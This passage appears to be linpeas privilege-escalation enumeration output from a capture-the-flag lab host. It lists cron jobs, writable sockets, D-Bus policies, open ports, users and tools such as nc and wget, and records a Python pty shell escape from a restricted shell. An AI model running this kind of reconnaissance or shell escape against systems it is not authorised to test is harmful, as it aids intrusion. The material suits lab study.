-rwxr-xr-x   1 root root  1474 Jun  1  2017 apt-compat
-rwxr-xr-x   1 root root   355 Oct 25  2016 bsdmainutils
-rwxr-xr-x   1 root root   384 Dec 12  2012 cracklib-runtime
-rwxr-xr-x   1 root root  1597 Feb 22  2017 dpkg
-rwxr-xr-x   1 root root    89 May  5  2015 logrotate
-rwxr-xr-x   1 root root  1065 Dec 13  2016 man-db
-rwxr-xr-x   1 root root   249 May 17  2017 passwd
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27 11:06 ..
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27 11:06 ..
-rwxr-xr-x   1 root root   313 May 29  2017 0anacron
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root  4096 Apr 26  2021 .
drwxr-xr-x 121 root root 12288 May 27 11:06 ..
-rwxr-xr-x   1 root root   312 May 29  2017 0anacron
-rwxr-xr-x   1 root root   723 Dec 13  2016 man-db
-rw-r--r--   1 root root   102 May  3  2015 .placeholder

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Apr 26  2021 .
drwxr-xr-x 7 root root 4096 Apr 26  2021 ..
-rw------- 1 root root    9 Jul 26 00:05 cron.daily
-rw------- 1 root root    9 Jul 25 03:49 cron.monthly
-rw------- 1 root root    9 Jul 25 03:44 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                                                                  
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                               

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                                     
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path                                                                                  
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                       
NEXT                         LEFT       LAST                         PASSED      UNIT                         ACTIVATES                                                         
Tue 2022-07-26 06:00:54 EDT  7min left  Tue 2022-07-26 05:01:14 EDT  51min ago   anacron.timer                anacron.service
Tue 2022-07-26 06:14:38 EDT  21min left Mon 2022-07-25 06:47:14 EDT  23h ago     apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue 2022-07-26 17:15:55 EDT  11h left   Tue 2022-07-26 03:50:14 EDT  2h 2min ago apt-daily.timer              apt-daily.service
Wed 2022-07-27 03:48:55 EDT  21h left   Tue 2022-07-26 03:48:55 EDT  2h 4min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                                                       
                                                                                                                                                                                
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                      
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /var/run/avahi-daemon/socket                                                    
/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /var/run/avahi-daemon/socket
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                      
/run/avahi-daemon/socket                                                                                                                                                        
  └─(Read Write)
/run/cups/cups.sock
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/minissdpd.sock
  └─(Read Write)
/run/systemd/cgroups-agent
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1001/bus
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1001/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1001/systemd/notify
  └─(Read Write)
/run/user/1001/systemd/private
  └─(Read Write)
/run/user/116/bus
/run/user/116/gnupg/S.gpg-agent
/run/user/116/gnupg/S.gpg-agent.browser
/run/user/116/gnupg/S.gpg-agent.extra
/run/user/116/gnupg/S.gpg-agent.ssh
/run/user/116/pulse/native
/run/user/116/systemd/private
/run/user/116/wayland-0
/run/vmware/guestServicePipe
  └─(Read Write)
/tmp/dbus-0VokmEkf
/tmp/dbus-AzdCOqdXki
/tmp/dbus-HE4dYqci
/tmp/dbus-IApOlbkv
/tmp/dbus-mDVRcRTx
/tmp/.ICE-unix/770
  └─(Read Write)
/tmp/.X11-unix/X1024
  └─(Read )
/var/run/avahi-daemon/socket
  └─(Read Write)
/var/run/cups/cups.sock
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/minissdpd.sock
  └─(Read Write)
/var/run/vmware/guestServicePipe
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                        
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)                                                                               
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
  <policy group="lp">)
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/gdm.conf (  <policy user="Debian-gdm">)
Possible weak user policy found on /etc/dbus-1/system.d/net.hadess.SensorProxy.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.ColorManager.conf (  <policy user="colord">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf (  <policy user="rtkit">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                        
NAME                                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                  
:1.0                                         1 systemd         root             :1.0          init.scope                -          -                  
:1.10                                      529 NetworkManager  root             :1.10         NetworkManager.service    -          -                  
:1.14                                      732 gdm3            root             :1.14         gdm.service               -          -                  
:1.15                                      745 gdm-session-wor root             :1.15         session-c1.scope          c1         -                  
:1.17                                      761 systemd         Debian-gdm       :1.17         user@116.service          -          -                  
:1.19                                      770 gnome-session-b Debian-gdm       :1.19         session-c1.scope          c1         -                  
:1.2                                       509 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
:1.20                                      780 gnome-shell     Debian-gdm       :1.20         session-c1.scope          c1         -                  
:1.21                                      786 upowerd         root             :1.21         upower.service            -          -                  
:1.3                                       505 avahi-daemon    avahi            :1.3          avahi-daemon.service      -          -                  
:1.4                                       510 rtkit-daemon    root             :1.4          rtkit-daemon.service      -          -                  
:1.43                                      895 pulseaudio      Debian-gdm       :1.43         user@116.service          -          -                  
:1.44                                      780 gnome-shell     Debian-gdm       :1.44         session-c1.scope          c1         -                  
:1.47                                      911 wpa_supplicant  root             :1.47         wpa_supplicant.service    -          -                  
:1.49                                      915 packagekitd     root             :1.49         packagekit.service        -          -                  
:1.50                                      912 gnome-settings- Debian-gdm       :1.50         session-c1.scope          c1         -                  
:1.51                                      929 colord          colord           :1.51         colord.service            -          -                  
:1.6                                       531 accounts-daemon[0m root             :1.6          accounts-daemon.service   -          -                  
:1.7                                       508 ModemManager    root             :1.7          ModemManager.service      -          -                  
:1.70                                    26433 cupsd           root             :1.70         cups.service              -          -                  
:1.71                                    26435 cups-browsed    root             :1.71         cups-browsed.service      -          -                  
:1.72                                    26435 cups-browsed    root             :1.72         cups-browsed.service      -          -                  
:1.76                                     1118 systemd-resolve systemd-resolve  :1.76         systemd-resolved.service  -          -                  
:1.83                                     7330 busctl          mindy            :1.83         session-493.scope         493        -                  
:1.9                                       562 polkitd         root             :1.9          polkit.service            -          -                  
com.hp.hplip                                 - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties                - -               -                (activatable) -                         -         
fi.epitest.hostap.WPASupplicant            911 wpa_supplicant  root             :1.47         wpa_supplicant.service    -          -                  
fi.w1.wpa_supplicant1                      911 wpa_supplicant  root             :1.47         wpa_supplicant.service    -          -                  
org.bluez                                    - -               -                (activatable) -                         -         
org.freedesktop.Accounts                   531 accounts-daemon[0m root             :1.6          accounts-daemon.service   -          -                  
org.freedesktop.Avahi                      505 avahi-daemon    avahi            :1.3          avahi-daemon.service      -          -                  
org.freedesktop.ColorManager               929 colord          colord           :1.51         colord.service            -          -                  
org.freedesktop.DBus                       518 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -                  
org.freedesktop.GeoClue2                     - -               -                (activatable) -                         -         
org.freedesktop.ModemManager1              508 ModemManager    root             :1.7          ModemManager.service      -          -                  
org.freedesktop.NetworkManager             529 NetworkManager  root             :1.10         NetworkManager.service    -          -                  
org.freedesktop.PackageKit                 915 packagekitd     root             :1.49         packagekit.service        -          -                  
org.freedesktop.PolicyKit1                 562 polkitd         root             :1.9          polkit.service            -          -                  
org.freedesktop.RealtimeKit1               510 rtkit-daemon    root             :1.4          rtkit-daemon.service      -          -                  
org.freedesktop.UDisks2                      - -               -                (activatable) -                         -         
org.freedesktop.UPower                     786 upowerd         root             :1.21         upower.service            -          -                  
org.freedesktop.hostname1                    - -               -                (activatable) -                         -         
org.freedesktop.locale1                      - -               -                (activatable) -                         -         
org.freedesktop.login1                     509 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1                     - -               -                (activatable) -                         -         
org.freedesktop.nm_dispatcher                - -               -                (activatable) -                         -         
org.freedesktop.realmd                       - -               -                (activatable) -                         -         
org.freedesktop.resolve1                  1118 systemd-resolve systemd-resolve  :1.76         systemd-resolved.service  -          -                  
org.freedesktop.systemd1                     1 systemd         root             :1.0          init.scope                -          -                  
org.freedesktop.timedate1                    - -               -                (activatable) -                         -         
org.gnome.DisplayManager                   732 gdm3            root             :1.14         gdm.service               -          -                  
 -- UID=0 EUID=0 
org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -         


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                                                         
                                        ╚═════════════════════╝                                                                                                                 
╔══════════╣ Hostname, hosts and DNS
solidstate                                                                                                                                                                      
127.0.0.1       localhost
127.0.1.1       osboxes

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 1.1.1.1 1.0.0.1

╔══════════╣ Interfaces
default         0.0.0.0                                                                                                                                                         
loopback        127.0.0.0
link-local      169.254.0.0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.51  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:5917  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:5917  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:59:17  txqueuelen 1000  (Ethernet)
        RX packets 20851  bytes 2952500 (2.8 MiB)
        RX errors 0  dropped 251  overruns 0  frame 0
        TX packets 42596  bytes 3606156 (3.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 10  bytes 852 (852.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10  bytes 852 (852.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:631                 :::*                    LISTEN      -                   
tcp6       0      0 :::119                  :::*                    LISTEN      -                   
tcp6       0      0 :::25                   :::*                    LISTEN      -                   
tcp6       0      0 :::5355                 :::*                    LISTEN      -                   
tcp6       0      0 :::4555                 :::*                    LISTEN      -                   
tcp6       0      0 :::110                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                              
                                                                                                                                                                                


                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                                                         
                                         ╚═══════════════════╝                                                                                                                  
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                        
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)                                                                                                                              

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                    
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                
                                                                                                                                                                                
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                
                                                                                                                                                                                
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                          
ptrace protection is disabled (0)                                                                                                                                               
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                      
                                                                                                                                                                                
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                 

╔══════════╣ Users with console
james:x:1000:1000:james:/home/james/:/bin/bash                                                                                                                                  
mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                          
uid=1000(james) gid=1000(osboxes) groups=1000(osboxes),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),114(lpadmin),116(scanner)
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=106(rtkit) gid=110(rtkit) groups=110(rtkit)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=109(geoclue) gid=115(geoclue) groups=115(geoclue)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(avahi) gid=117(avahi) groups=117(avahi)
uid=111(colord) gid=118(colord) groups=118(colord)
uid=112(saned) gid=119(saned) groups=119(saned),116(scanner)
uid=113(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=114(pulse) gid=120(pulse) groups=120(pulse),29(audio)
uid=115(hplip) gid=7(lp) groups=7(lp)
uid=116(Debian-gdm) gid=122(Debian-gdm) groups=122(Debian-gdm)
uid=117(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 05:53:21 up 1 day,  2:19,  1 user,  load average: 0.63, 0.16, 0.05                                                                                                             
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
mindy    pts/0    10.10.14.3       02:24   41.00s  0.08s  0.05s python -c import pty;pty.spawn("/bin/bash")

╔══════════╣ Last logons
mindy    pts/0        Tue Jul 26 02:24:48 2022   still logged in                       10.10.14.3                                                                               
mindy    pts/2        Mon Jul 25 11:11:14 2022 - Mon Jul 25 13:28:11 2022  (02:16)     10.10.14.3
mindy    pts/0        Mon Jul 25 10:58:24 2022 - Mon Jul 25 13:19:43 2022  (02:21)     10.10.14.3
mindy    pts/0        Mon Jul 25 10:53:24 2022 - Mon Jul 25 10:54:44 2022  (00:01)     10.10.14.3
mindy    pts/0        Mon Jul 25 10:52:09 2022 - Mon Jul 25 10:52:59 2022  (00:00)     10.10.14.3
mindy    pts/0        Mon Jul 25 06:42:14 2022 - Mon Jul 25 08:58:23 2022  (02:16)     10.10.14.3

wtmp begins Mon Jul 25 06:42:14 2022

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                               
root             tty2                      Mon Apr 26 12:58:44 -0400 2021
mindy            pts/0    10.10.14.3       Tue Jul 26 02:24:48 -0400 2022

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                                
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                


                                       ╔══════════════════════╗
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                                                          
                                       ╚══════════════════════╝                                                                                                                 
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                 
/usr/bin/curl
/bin/nc
/bin/nc.traditional
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/wget
/usr/bin/xterm

╔══════════╣ Installed Compilers
                                                                                                                                                                                

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.25 (Debian)                                                                                                                          
Server built:   2017-07-18T18:37:33
httpd Not Found
                                                                                                                                                                                
Nginx version: nginx Not Found
                                                                                                                                                                                
./linpeas.sh: 2593: ./linpeas.sh: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Apr 26  2021 /etc/apache2/sites-enabled                                                                                                             
drwxr-xr-x 2 root root 4096 Apr 26  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Aug 22  2017 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jul 16  2017 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Aug 22  2017 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                              
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr 26  2021 /etc/NetworkManager/system-connections                                                                                                 
drwxr-xr-x 2 root root 4096 Apr 26  2021 /etc/NetworkManager/system-connections


╔══════════╣ Analyzing VNC Files (limit 70)
                                                                                                                                                                                



-rw-r--r-- 1 root root 5955 Jun 18  2017 /usr/share/mime/application/x-vnc.xml
<?xml version="1.0" encoding="utf-8"?>
<mime-type xmlns="http://www.freedesktop.org/standards/shared-mime-info" type="application/x-vnc">
  <!--Created automatically by update-mime-database. DO NOT EDIT!-->
  <sub-class-of type="text/plain"/>
  <comment>Remote Desktop (VNC) file</comment>
  <comment xml:lang="ar">ملف (VNC) لسطح المكتب البعيد</comment>
  <comment xml:lang="as">দৰবৰত ডসকটপ (VNC) ফইল</comment>
  <comment xml:lang="ast">Ficheru d'escritoriu remotu (VNC)</comment>
  <comment xml:lang="be">Файл аддаленага стала (VNC)</comment>
  <comment xml:lang="be@latin">Fajł addalenaha stała (VNC)</comment>
  <comment xml:lang="bg">Файл за отдалечена връзка (vnc)</comment>
  <comment xml:lang="bn">দরবরত ডসকটপ (VNC) ফইল</comment>
  <comment xml:lang="bn_IN">দরবরত ডসকটপ (VNC) ফইল</comment>
  <comment xml:lang="bs">Konfiguraciona datoteka udaljene radne površine (VNC)</comment>
  <comment xml:lang="ca">Fitxer d'escriptori remot (VNC)</comment>
  <comment xml:lang="ca@valencia">Fitxer d'escriptori remot (VNC)</comment>
  <comment xml:lang="cs">Vzdálená plocha (VNC)</comment>
  <comment xml:lang="da">Fjernskrivebordsfil (VNC)</comment>
  <comment xml:lang="de">»Entfernter Bildschirm (VNC)«-Datei</comment>
  <comment xml:lang="el">Αρχείο (VNC) απομακρυσμένης επιφ. εργασίας</comment>
  <comment xml:lang="en@shaw">𐑮𐑦𐑥𐑴𐑑 𐑛𐑧𐑕𐑒𐑑𐑪𐑐 (VNC) 𐑓𐑲𐑤</comment>
  <comment xml:lang="en_GB">Remote Desktop (VNC) file</comment>
  <comment xml:lang="es">Archivo de escritorio remoto (VNC)</comment>
  <comment xml:lang="et">Kaugtöölaua (VNC) fail</comment>
  <comment xml:lang="eu">Urruneko mahaigainaren (VNC) fitxategia</comment>
  <comment xml:lang="fa">پرونده رومیزی دوردست (VNC)</comment>
  <comment xml:lang="fi">Etätyöpöydän VNC-tiedosto</comment>
  <comment xml:lang="fr">Fichier d'accès à distance (VNC)</comment>
  <comment xml:lang="fur">File di scritori rimot (VNC)</comment>
  <comment xml:lang="gl">Ficheiro de escritorio remoto (VNC)</comment>
  <comment xml:lang="gu">દરસથ ડસકટપ (VNC) ફઇલ</comment>
  <comment xml:lang="he">קובץ שולחן עבודה מרוחק (VNC)</comment>
  <comment xml:lang="hi">रमट डसकटप (वएनस) फइल</comment>
  <comment xml:lang="hu">Távoli asztal (VNC) fájl</comment>
  <comment xml:lang="id">Berkas Desktop Jauh (VNC)</comment>
  <comment xml:lang="is">Fjaraðgangsskrá (VNC)</comment>
  <comment xml:lang="it">File desktop remoto (VNC)</comment>
  <comment xml:lang="ja">リモートデスクトップ (VNC) のファイル</comment>
  <comment xml:lang="kk">Қашықтағы жұмыс үстел (VNC) файлы</comment>
  <comment xml:lang="kn">ದರಸಥ ಗಣಕತರ (VNC) ಕಡತ</comment>
  <comment xml:lang="ko">원격 데스크톱(VNC) 파일</comment>
  <comment xml:lang="lt">Nutolusio darbalaukio (VNC) failas</comment>
  <comment xml:lang="lv">Attālinātās darbvirsmas (VNC) datne</comment>
  <comment xml:lang="mk">Remote Desktop (VNC) датотека</comment>
  <comment xml:lang="ml">വദര പണയട (വഎനസ) ഫയല</comment>
  <comment xml:lang="mr">दरसथ डसकटप (VNC) फइल</comment>
  <comment xml:lang="nb">Fil for eksternt skrivebord (VNC)</comment>
  <comment xml:lang="ne">टढ डसकटप (भएनस) फइल</comment>
  <comment xml:lang="nl">Werkblad op afstand (VNC)-bestand</comment>
  <comment xml:lang="nn">Fil for eksternt skrivebord (VNC)</comment>
  <comment xml:lang="oc">Fichièr d'accès a distància (VNC)</comment>
  <comment xml:lang="or">ସଦର ଡସକଟପ (VNC) ଫଇଲ</comment>
  <comment xml:lang="pa">ਰਮਟ ਡਸਕਟਪ (VNC) ਫਇਲ</comment>
  <comment xml:lang="pl">Plik zdalnego pulpitu (VNC)</comment>
  <comment xml:lang="pt">Ficheiro de área de trabalho remota (VNC)</comment>
  <comment xml:lang="pt_BR">Arquivo de área de trabalho remota (VNC)</comment>
  <comment xml:lang="ro">Fișier desktop la distanță (VNC)</comment>
  <comment xml:lang="ru">Файл удалённого рабочего стола (VNC)</comment>
  <comment xml:lang="si">දරසථ තර මහණත (VNC) ගනව</comment>
  <comment xml:lang="sk">Súbor vzdialenej pracovnej plochy (VNC)</comment>
  <comment xml:lang="sl">Datoteka (VNC) oddaljenega namizja</comment>
  <comment xml:lang="sq">File desktop në distancë (VNC)</comment>
  <comment xml:lang="sr">Датотека удаљене радне површи (VNC)</comment>
  <comment xml:lang="sr@latin">Datoteka udaljene radne površi (VNC)</comment>
  <comment xml:lang="sv">Fjärrskrivbordsfil (VNC)</comment>
  <comment xml:lang="ta">தல பணமட (வஎனச(VNC)) கபப</comment>
  <comment xml:lang="te">రమట డసకటప (VNC) ఫల</comment>
  <comment xml:lang="th">แฟมพนโตะระยะไกล (VNC)</comment>
  <comment xml:lang="tr">Uzak Masaüstü(VNC) dosyası</comment>
  <comment xml:lang="ug">يىراقتىكى ئۈستەلئۈستى(VNC) ھۆججىتى</comment>
  <comment xml:lang="uk">Файл віддаленої стільниці (VNC)</comment>
  <comment xml:lang="vi">Tập tin màn hình nền từ xa (VNC)</comment>
  <comment xml:lang="zh_CN">远程桌面(VNC)文件</comment>
  <comment xml:lang="zh_HK">遠端桌面(VNC)文件</comment>
  <comment xml:lang="zh_TW">遠端桌面(VNC)文件</comment>
  <glob pattern="*.vnc"/>
</mime-type>

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                            
drwxr-xr-x 2 root root 4096 Apr 26  2021 /etc/ldap


╔══════════╣ Searching ssl/ssh files
PermitRootLogin yes                                                                                                                                                             
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

══╣ Some home ssh config file was found
